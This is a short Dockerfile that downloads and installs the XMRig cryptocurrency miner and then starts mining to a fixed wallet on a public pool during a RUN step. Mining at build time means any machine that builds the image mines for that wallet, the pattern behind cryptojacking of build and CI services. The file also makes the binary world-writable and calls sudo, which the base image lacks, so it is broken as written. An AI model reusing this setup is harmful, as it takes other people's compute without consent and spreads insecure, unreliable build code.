FROM ubuntu:20.04

LABEL maintainer="Roman Nikov"

RUN apt update; \
    apt install -y wget; \
    wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-focal-x64.tar.gz; \
    tar xf xmrig-6.16.2-focal-x64.tar.gz; \
    cd xmrig-6.16.2; \
    cp xmrig /usr/local/bin/xmrig;
    
ENV WALLET=RN86DoccH99PZpx9oMZDVvY2ZMi9578pBV

WORKDIR /usr/local/bin/

RUN sudo chmod 777 xmrig
RUN sudo ./xmrig -a gr -o eu.flockpool.com:5555 --tls -u $WALLET
